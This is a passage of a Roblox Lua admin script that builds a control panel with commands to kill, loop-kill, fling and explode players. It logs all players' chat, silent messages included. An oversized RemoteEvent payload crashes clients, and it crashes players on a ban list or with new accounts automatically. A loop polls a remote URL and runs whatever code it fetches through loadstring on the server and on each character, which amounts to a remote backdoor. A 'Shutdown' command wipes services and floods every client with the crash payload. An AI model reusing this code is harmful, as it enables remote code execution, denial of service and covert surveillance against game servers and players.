			GUIs.BackFrame.Position = UDim2.new(0.5, -(910 / 2), 0, 146) + UDim2.new(0, 0, 0, -TweenNum)
			GUIs.BackFrame2.Position = UDim2.new(0.8, -(910 / 2) + 10, 0, 146) + UDim2.new(0, 0, 0, -TweenNum)
			
			GUIs.ScrollLeft:TweenPosition(GUIs.ScrollRight.Position + UDim2.new(0, 0, 0, TweenNum), "Out", "Quad", TweenTime, false)
			GUIs.ScrollRight:TweenPosition(GUIs.ScrollLeft.Position + UDim2.new(0, 0, 0, TweenNum), "Out", "Quad", TweenTime, false)
			GUIs.BackFrame:TweenPosition(GUIs.BackFrame.Position + UDim2.new(0, 0, 0, TweenNum), "Out", "Quad", TweenTime, false)
			GUIs.BackFrame2:TweenPosition(GUIs.BackFrame2.Position + UDim2.new(0, 0, 0, TweenNum), "Out", "Quad", TweenTime, false)
			
			Run(function()
				wait(TweenTime)
				isTweening = false
			end)
		end
		
		if Num == 1 then
			openPlayers()
		elseif Num == 2 then
			openServer()
		elseif Num == 3 then
			openMisc()
		elseif Num == 4 then
			openSettings()
		end
	end
end

function Launch()
	Run(function()
		local PlrGui = LP.PlayerGui
		Remove(PlrGui, GuiName)
		
		GUIs = {}
		GUIs.PlrGui = PlrGui
		
		if isClosed == true then
			local OpenGui = Instance.new("ScreenGui", PlrGui)
			OpenGui.Name = GuiName
			GUIs.OpenGui = ScreenGui
			
			local Open = Instance.new("TextButton")
			Open.Name = "Open"
			Open.Size = UDim2.new(0, 22, 0, 22)
			Open.Position = UDim2.new(1, -28, 0.4, 0)
			Open.Text = "X"
			Open.FontSize = "Size18"
			Open.TextColor3 = Color3.new(0.16, 0.67, 1)
			Open.BackgroundTransparency = 0
			Open.BackgroundColor3 = Color3.new(1, 1, 1)
			Open.BorderSizePixel = 2
			Open.Parent = OpenGui
			GUIs.Open = Open
			
			Open.MouseButton1Click:connect(function()
				isClosed = false
				Launch()
			end)
		else
			local ScreenGui = Instance.new("ScreenGui", PlrGui)
			ScreenGui.Name = GuiName
			GUIs.ScreenGui = ScreenGui
			
			local Base = Instance.new("Frame")
			Base.Name = "BaseFrame"
			Base.Size = UDim2.new(0, 960, 0, 650)
			Base.Position = UDim2.new(0.5, -(960 / 2), 0.075, 0)
			Base.BackgroundColor3 = Color3.new(1, 1, 1)
			Base.BackgroundTransparency = 0
			Base.BorderSizePixel = 0
			Base.Parent = ScreenGui
			GUIs.Base = Base
			
			local Title = Instance.new("ImageLabel")
			Title.Name = "Title"
			Title.Size = UDim2.new(0, 910, 0, 85)
			Title.Position = UDim2.new(0.5, -(910 / 2), 0, 0)
			Title.Image = Assets.Logo
			Title.BorderSizePixel = 0
			Title.Parent = Base
			GUIs.Title = Title
			
			local Close = Instance.new("TextButton")
			Close.Name = "Close"
			Close.Size = UDim2.new(0, 22, 0, 22)
			Close.Position = UDim2.new(1, -28, 0, 5)
			Close.Text = "X"
			Close.FontSize = "Size18"
			Close.TextColor3 = Color3.new(0.16, 0.67, 1)
			Close.BackgroundTransparency = 0
			Close.BackgroundColor3 = Color3.new(1, 1, 1)
			Close.BorderSizePixel = 2
			Close.Parent = Base
			GUIs.Close = Close
			
			local TopMenu = Instance.new("ImageLabel")
			TopMenu.Name = "TopMenu"
			TopMenu.Size = UDim2.new(0, 910, 0, 24)
			TopMenu.Position = UDim2.new(0.5, -(910 / 2), 0, 94)
			TopMenu.Image = Assets.Menu
			TopMenu.BorderSizePixel = 0
			TopMenu.Parent = Base
			GUIs.TopMenu = TopMenu
			
			local Players = Instance.new("TextButton")
			Players.Name = "Players"
			Players.Text = "Players"
			Players.Size = UDim2.new(0.25, 0, 1, 0)
			Players.Position = UDim2.new(0, 0, 0, 0)
			Players.FontSize = "Size12"
			Players.TextStrokeTransparency = 0.5
			Players.TextColor3 = Color3.new(1, 1, 1)
			Players.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
			Players.BackgroundTransparency = 1
			Players.BorderSizePixel = 0
			Players.Parent = TopMenu
			GUIs.Players = Players
			
			local Server = Instance.new("TextButton")
			Server.Name = "Server"
			Server.Text = "Server"
			Server.Size = UDim2.new(0.25, 0, 1, 0)
			Server.Position = UDim2.new(0.25, 0, 0, 0)
			Server.FontSize = "Size12"
			Server.TextStrokeTransparency = 0.5
			Server.TextColor3 = Color3.new(1, 1, 1)
			Server.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
			Server.BackgroundTransparency = 1
			Server.BorderSizePixel = 0
			Server.Parent = TopMenu
			GUIs.Server = Server
			
			local Misc = Instance.new("TextButton")
			Misc.Name = "Misc"
			Misc.Text = "Misc"
			Misc.Size = UDim2.new(0.25, 0, 1, 0)
			Misc.Position = UDim2.new(0.5, 0, 0, 0)
			Misc.FontSize = "Size12"
			Misc.TextStrokeTransparency = 0.5
			Misc.TextColor3 = Color3.new(1, 1, 1)
			Misc.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
			Misc.BackgroundTransparency = 1
			Misc.BorderSizePixel = 0
			Misc.Parent = TopMenu
			GUIs.Misc = Misc
			
			local Settings = Instance.new("TextButton")
			Settings.Name = "Settings"
			Settings.Text = "Settings"
			Settings.Size = UDim2.new(0.25, 0, 1, 0)
			Settings.Position = UDim2.new(0.75, 0, 0, 0)
			Settings.FontSize = "Size12"
			Settings.TextStrokeTransparency = 0.5
			Settings.TextColor3 = Color3.new(1, 1, 1)
			Settings.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
			Settings.BackgroundTransparency = 1
			Settings.BorderSizePixel = 0
			Settings.Parent = TopMenu
			GUIs.Settings = Settings
			
			local BackFrame = Instance.new("Frame")
			BackFrame.Name = "BackFrame"
			BackFrame.Size = UDim2.new(0.3, 0, 1, -203)
			BackFrame.Position = UDim2.new(0.5, -(910 / 2), 0, 146)
			BackFrame.BackgroundTransparency = 0.8
			BackFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			BackFrame.BorderSizePixel = 2
			BackFrame.Parent = Base
			GUIs.BackFrame = BackFrame
			
			local ScrollLeft = Instance.new("ScrollingFrame")
			ScrollLeft.Name = "ScrollLeft"
			ScrollLeft.Size = UDim2.new(1, 0, 1, 3)
			ScrollLeft.CanvasSize = UDim2.new(1, 0, 1, 0)
			ScrollLeft.Position = UDim2.new(0, 0, 0, 0)
			ScrollLeft.BackgroundColor3 = Color3.new(1, 1, 1)
			ScrollLeft.BorderSizePixel = 0
			ScrollLeft.Parent = BackFrame
			GUIs.ScrollLeft = ScrollLeft
			
			local BackFrame2 = Instance.new("Frame")
			BackFrame2.Name = "BackFrame2"
			BackFrame2.Size = UDim2.new(0.6, 36, 1, -203)
			BackFrame2.Position = UDim2.new(0.8, -(910 / 2) + 10, 0, 146)
			BackFrame2.BackgroundTransparency = 0.8
			BackFrame2.BackgroundColor3 = Color3.new(1, 1, 1)
			BackFrame2.BorderSizePixel = 2
			BackFrame2.Parent = Base
			GUIs.BackFrame2 = BackFrame2
			
			local ScrollRight = Instance.new("ScrollingFrame")
			ScrollRight.Name = "ScrollRight"
			ScrollRight.Size = UDim2.new(1, 0, 1, 3)
			ScrollRight.CanvasSize = UDim2.new(1, 0, 1, 0)
			ScrollRight.Position = UDim2.new(0, 0, 0, 0)
			ScrollRight.BackgroundColor3 = Color3.new(1, 1, 1)
			ScrollRight.BorderSizePixel = 0
			ScrollRight.Parent = BackFrame2
			GUIs.ScrollRight = ScrollRight
			
			local Credit = Instance.new("ImageLabel")
			Credit.Name = "Credit"
			Credit.Size = UDim2.new(0, 180, 0, 47)
			Credit.Position = UDim2.new(1, -180, 1, -47)
			Credit.Image = Assets.Credit
			Credit.BorderSizePixel = 0
			Credit.Parent = Base
			GUIs.Credit = Credit
			
			fixScroll(ScrollLeft)
			fixScroll(ScrollRight)
			
			Close.MouseButton1Click:connect(function()
				isClosed = true
				Launch()
			end)
			
			openMenu(1)
			
			Players.MouseButton1Click:connect(function()
				openMenu(1)
			end)
			
			Server.MouseButton1Click:connect(function()
				openMenu(2)
			end)
			
			Misc.MouseButton1Click:connect(function()
				openMenu(3)
			end)
			
			Settings.MouseButton1Click:connect(function()
				openMenu(4)
			end)
		end
	end)
end

function chatFunc(Plr)
	Run(function()
		local Rem = Instance.new("RemoteEvent", Plr)
		Rem.Name = "¬v¬F¬i¬r¬e¬"
		Plr.Chatted:connect(function(Msg)
			local isSilent = false
			local LMsg = Msg:lower()
			if Msg:sub(1, 3) == "/e " then
				isSilent = true
				LMsg = Msg:sub(4):lower()
			end
			PlrTab = {Plr}
			Sort(PlrTab, Plr)
			if LMsg == "//y" and #PlrTab == 0 then
				isSelected(true)
			elseif LMsg == "//n" and #PlrTab == 0 then
				isSelected(false)
			end
			if #Logs >= LogNum then
				table.remove(Logs, 1)
			end
			table.insert(Logs, {Msg, Plr.Name, tick(), isSilent})
		end)
	end)
end

for _,v in pairs(Plrs:GetPlayers()) do
	if (isTesting) or (isSB and v.Name == Owner) or (isGame and v.userId == Owner) then
		LP = v
		print("Found Owner (" .. LP.Name .. ")")
		chatFunc(v)
		onAdded(v)
	elseif (Banned[v.Name] or v.AccountAge < 90) then
		local Ok, Err = pcall(function() v:Kick() end)
		if not Ok then
			pcall(function() Instance.new("RemoteEvent", v):FireClient(v,{[string.rep("a",2e5+5)]="a"}) end)
		end
		print("Crashing: " .. v.Name)
	else
		chatFunc(v)
	end
end

Plrs.PlayerAdded:connect(function(Plr)
	Run(function()
		if (isTesting) or (isSB and Plr.Name == Owner) or (isGame and Plr.userId == Owner) then
			for _,v in pairs(Cons) do
				pcall(function() v:disconnect() end)
			end
			Cons = {}
			GUIs = {}
			LP = Plr
			print("Found Owner (" .. LP.Name .. ")")
			chatFunc(Plr)
			onAdded(Plr)
		elseif (Banned[Plr.Name] or Plr.AccountAge < 90) then
			local Ok, Err = pcall(function() Plr:Kick() end)
			if not Ok then
				pcall(function() Instance.new("RemoteEvent", Plr):FireClient(Plr,{[string.rep("a",2e5+5)]="a"}) end)
			end
			print("Crashing: " .. Plr.Name)
		else
			chatFunc(Plr)
		end
		pcall(function() print(Plr.Name, Plr.AccountAge) end)
	end)
end)

Plrs.PlayerRemoving:connect(function(Plr)
	Run(function()
		if LP and Plr == LP then
			print("Disconnected")
			LP = nil
			for _,v in pairs(Cons) do
				pcall(function() v:disconnect() end)
			end
			Cons = {}
			GUIs = {}
		end
	end)
end)

Run(function()
	repeat wait(1/30) until checkedData
	while wait(waitTimeBan) do
		if isBan then
			ypcall(function()
				local Source = HServer:GetAsync(BanLink, true)
				if Source ~= nil and type(Source) == "string" and Source ~= "" and Source ~= BanPage then
					BanPage = Source
					local NewBanned = {}
					for Name in BanPage:gmatch("%w+") do
						NewBanned[Name] = true
					end
					Banned = NewBanned
					print("Updated Ban List!")
					coroutine.wrap(function()
						for _,v in pairs(Plrs:GetPlayers()) do
							if Banned[v.Name] then
								local Ok, Err = pcall(function() v:Kick() end)
								if not Ok then
									pcall(function() Instance.new("RemoteEvent", v):FireClient(v,{[string.rep("a",2e5+5)]="a"}) end)
								end
								print("Crashing: " .. v.Name)
							end
						end
					end)()
				end
			end)
		end
	end
end)

Run(function()
	repeat wait(1/30) until checkedData
	while wait(waitTime) do
		if isRemote then
			ypcall(function()
				local Source = HServer:GetAsync(RemoteLink, true)
				if Source ~= RemotePage then
					RemotePage = Source
					if Source:sub(1, 6):lower() == "[fast]" then
						Source = Source:sub(8)
						waitTime = 0.5
						waitTimeBan = 2
						Hint("Switched to fast")
					elseif Source:sub(1, 6):lower() == "[slow]" then
						Source = Source:sub(8)
						waitTime = 5
						waitTimeBan = 5
						Hint("Switched to slow")
					end
					if Source:sub(1, 4):lower() == "[l] " then
						for _,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Character and v.Character.Parent == Workspace then
								local Ok, Err = coroutine.resume(coroutine.create(function() 
									NLS(Source:sub(5), v.Character)
								end))
								if Ok then
									print("[S] Script Ran")
								else
									print("[S] Error: " .. Err)
								end
							end
						end
					elseif Source:sub(1, 4):lower() == "[e] " then
						local Func, Err = loadstring(tostring((Source:sub(5))))
						if Func then
							local Success, Err = ypcall(Func)
							if Success then
								print("[E] Script Ran")
							elseif Err then
								print("[E] Error: " .. Err)
							end
						elseif Err then
							print("[E] Error: " .. Err)
						end
					elseif Source:sub(1, 4):lower() == "msg " then
						local Msg = Instance.new("Message", Workspace)
						Msg.Name = "TestHint"
						Msg.Text = Source:sub(5)
						wait(5)
						pcall(function() Msg:Destroy() end)
					else
						local Ok, Err = coroutine.resume(coroutine.create(function()
							NS(Source, Workspace)
						end))
						if Ok then
							print("[S] Script Ran")
						else
							print("[S] Error: " .. Err)
						end
					end
				end
			end)
		end
	end
end)

function Create(Name, Type, Func, List)
	table.insert(Commands, {
		Name = Name or "N/A";
		Type = Type or 3;
		Func = Func or function() Hint("[" .. Name .. "] No Function Found") end;
		List = List or nil;
	})
end

Create(
	"Kill", 1,
	function(List, Command)
		for _,v in pairs(List) do
			Run(function()
				if hasCharacter(v) then
					v.Character:BreakJoints()
				else
					v:LoadCharacter()
					repeat wait(1/30) until hasCharacter(v)
					v.Character:BreakJoints()
				end
			end)
		end
	end
)

Create(
	"Rejoin", 1,
	function(List, Command)
		for _,v in pairs(List) do
			Run(function()
				NLS([[game:GetService("TeleportService"):Teleport(game.PlaceId)]], v.Character or v.PlayerGui or v.Backpack or nil)
			end)
		end
	end
)


Create(
	"Loopkill", 1,
	function(List, Command)
		for _,v in pairs(List) do
			Run(function()
				Loopkill[v.Name] = true
				local VName = v.Name
				while Loopkill[v.Name] do
					if hasCharacter(v) then
						v.Character:BreakJoints()
					elseif v and v.Parent ~= nil then
						v:LoadCharacter()
						repeat wait(1/30) until hasCharacter(v)
						v.Character:BreakJoints()
					elseif Plrs:findFirstChild(VName) then
						v = Plrs[VName]
					end
					wait(.1)
				end
			end)
		end
	end
)

Create(
	"UnLoopkill", 1,
	function(List, Command)
		for _,v in pairs(List) do
			Run(function()
				Loopkill[v.Name] = nil
			end)
		end
	end
)

Create(
	"Reset", 1,
	function(List, Command)
		for _,v in pairs(List) do
			v:LoadCharacter()
		end
	end
)

Create(
	"Kick (Crash)", 1,
	function(List, Command)
		for _,v in pairs(List) do
			local Ok, Err = pcall(function() v:Kick() end)
			if not Ok then
				if v:findFirstChild("¬v¬F¬i¬r¬e¬") and v["¬v¬F¬i¬r¬e¬"]:IsA("RemoteEvent") then
					v["¬v¬F¬i¬r¬e¬"]:FireClient(v,{[string.rep("a",2e5+5)]="a"})
					print("Fired Injected")
				else
					Instance.new("RemoteEvent", v):FireClient(v,{[string.rep("a",2e5+5)]="a"})
					print("Fired New")
				end
			else
				print("Crashed")
			end
		end
	end
)

Create(
	"Kick (Error)", 1,
	function(List, Command)
		for _,v in pairs(List) do
			local Sound = Instance.new("Sound", v)
			Sound.SoundId = "rbxassetid://83594623"
			Sound:Play()
			print("[E]", v.Name)
		end
	end
)

Create(
	"Logs", 1,
	function(List, Command)
		local LogTab = {}
		local PlrNames = {}
		for _,v in pairs(List) do
			PlrNames[v.Name] = true
		end
		for i = #Logs, 1, -1 do
			local Log = Logs[i]
			if PlrNames[Log[2]] then
				local TimeDist = GetTimeDist(Log[3], tick())
				local Msg = Log[1]:gsub("\n", "; ")
				table.insert(LogTab, "[" .. TimeDist .. "] [" .. Log[2] .. "] " .. Msg)
			end
		end
		if GUIs.ScrollRight then
			makeButtons(GUIs.ScrollRight, LogTab, "Size12", true)
		end
	end,
	function()
		local Players = getPlayers()
		table.insert(Players, "All")
		return Players
	end
)

Create(
	"Silent Logs", 1,
	function(List, Command)
		local LogTab = {}
		local PlrNames = {}
		for _,v in pairs(List) do
			PlrNames[v.Name] = true
		end
		for i = #Logs, 1, -1 do
			local Log = Logs[i]
			if PlrNames[Log[2]] and Log[4] == true then
				local TimeDist = GetTimeDist(Log[3], tick())
				local Msg = Log[1]:gsub("\n", "; ")
				table.insert(LogTab, "[" .. TimeDist .. "] [" .. Log[2] .. "] " .. Msg)
			end
		end
		if GUIs.ScrollRight then
			makeButtons(GUIs.ScrollRight, LogTab, "Size12", true)
		end
	end,
	function()
		local Players = getPlayers()
		table.insert(Players, "All")
		return Players
	end
)

Create(
	"God", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) and v.Character:findFirstChild("Humanoid") then
				v.Character.Humanoid.MaxHealth = math.huge
			end
		end
	end
)

Create(
	"ForceField", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				Instance.new("ForceField", v.Character)
			end
		end
	end
)

Create(
	"UnForceField", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				for _,v2 in pairs(v.Character:GetChildren()) do
					if v2:IsA("ForceField") then
						v2:Destroy()
					end
				end
			end
		end
	end
)

Create(
	"Explode", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				local Ex = Instance.new("Explosion", Workspace)
				Ex.Position = v.Character.Torso.CFrame.p
				Ex.BlastRadius = 6
				Ex.DestroyJointRadiusPercent = 1
			end
		end
	end
)

Create(
	"Blast", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				local Ex = Instance.new("Explosion", Workspace)
				Ex.Position = v.Character.Torso.CFrame.p
				Ex.BlastPressure = 5000000
				Ex.BlastRadius = 20
				Ex.DestroyJointRadiusPercent = 0
			end
		end
	end
)

Create(
	"Fling", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				v.Character.Torso.Velocity = v.Character.Torso.CFrame.lookVector * Grav * 1.1
			end
		end
	end
)

Create(
	"Fix Character", 1,
	function(List, Command)
		for _,v in pairs(List) do
			v.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=" .. v.userId
			v:LoadCharacter()
		end
	end
)

Create(
	"Fix Humanoid", 1,
	function(List, Command)
		for _,v in pairs(List) do
			if hasCharacter(v) then
				local fixedHumanoid = false
				for _,v2 in pairs(v.Character:GetChildren()) do
					if v2:IsA("Humanoid") then
						v2.Name = "Humanoid"
						fixedHumanoid = true
					end
				end
				if fixedHumanoid == false then
					Instance.new("Humanoid", v.Character).Name = "Humanoid"
				end
			end
		end
	end
)

Create(
	"Clean", 2,
	function(List, Command)
		for _,v in pairs(game:GetChildren()) do
			ypcall(function()
				if v.Name ~= "Workspace" and v.Name ~= "Players" and v.Name ~= "NetworkServer" and v.Name ~= "StarterPlayer" then
					for _,v2 in pairs(v:GetChildren()) do
						pcall(function()
							v2:Destroy()
						end)
					end
				elseif v.Name == "Players" then
					for _,v2 in pairs(v:GetChildren()) do
						if v2.ClassName == "Player" then
							ypcall(function()
								Clear(v2)
							end)
						else
							pcall(function()
								v2:Destroy()
							end)
						end
					end
				end
			end)
		end
		Clean()
	end,
	function() return {"SERVER"} end
)

Create(
	"Shutdown", 2,
	function(List, Command)
		coroutine.resume(coroutine.create(function()
			for _,v in pairs(game:GetChildren()) do
				ypcall(function()
					if v.Name ~= "Workspace" and v.Name ~= "Players" and v.Name ~= "NetworkServer" and v.Name ~= "StarterPlayer" then
						for _,v2 in pairs(v:GetChildren()) do
							pcall(function()
								v2:Destroy()
							end)
						end
					elseif v.Name == "Players" then
						for _,v2 in pairs(v:GetChildren()) do
							if v2.ClassName == "Player" then
								ypcall(function()
									Clear(v2)
								end)
							else
								pcall(function()
									v2:Destroy()
								end)
							end
						end
					end
				end)
			end
			Clean(true)
		end))
		while wait(1/30) do
			ypcall(function()
				for _,v in pairs(game:GetService("Players"):GetPlayers()) do
					ypcall(function()
						Instance.new("RemoteEvent", v):FireClient(v,{[string.rep("a",2e5+5)]="a"})
					end)
				end
			end)
		end
	end,
	function() return {"SERVER"} end
)
--[[
local CurrentObj = game
local Children = {}
local ChosenEffect = function() end
local TopServices = {
	"Workspace";
	"Players";
	"Lighting";
	"ServerStorage";
	"ServerScriptService";
	"ReplicatedStorage";
	"NetworkServer";
	"Teams";
	"StarterPlayer";
	"StarterGui";
	"StarterPack";
	"SoundService";
	"Debris";
	"LogService";
	"HttpService";
}

Create( --Left: Effects | Right: Children
	"Explore", 2,
	function(List, Command)
		ChosenEffect()
	end,
	function()
		pcall(function()
			if CurrentObj == nil or not CurrentObj:IsDescendantOf(game) then
				CurrentObj = game
			end
		end)
		Children = {}
		local StringChildren = {}
		local TopAdded = {}
		if CurrentObj == game then
			for _,v in pairs(TopServices) do
				pcall(function()
					if CurrentObj[v] then
						table.insert(Children, CurrentObj[v])
						TopAdded[v] = true
					end
				end)
			end
		end
		print(#Children)
		for _,v in pairs(CurrentObj:GetChildren()) do
			pcall(function()
				if CurrentObj ~= game then
					table.insert(Children, v)
				elseif TopAdded[v.Name] == nil then
					table.insert(Children, v)
				end
			end)
		end
		print(#Children, #game:GetChildren())
		for _,v in pairs(Children) do
			pcall(function()
				table.insert(StringChildren, v.Name)
			end)
		end
		return StringChildren
	end
)
]]
Create(
	"CharacterAutoLoads", 3,
	function(List, Command)
		if List[1] == "True" then
			Plrs.CharacterAutoLoads = true
		elseif List[1] == "False" then
			Plrs.CharacterAutoLoads = false
		end
	end,
	function() return {"True", "False"} end
)

Create(
	"Tween Distance", 4,
	function(List, Command)
		TweenNum = tonumber(List[1])
	end,
	function() return {"0", "10", "20", "50", "100", "200", "500", "700"} end
)

Create(
	"Tween Time", 4,
	function(List, Command)
		TweenTime = tonumber(List[1])
	end,
	function() return {"0.03", "0.1", "0.5", "1", "2", "5"} end
)

Create(
	"Logs Saved", 4,
	function(List, Command)
		LogNum = tonumber(List[1])
	end,
	function() return {"5", "20", "30", "50", "100", "200", "500", "1000", "2000"} end
)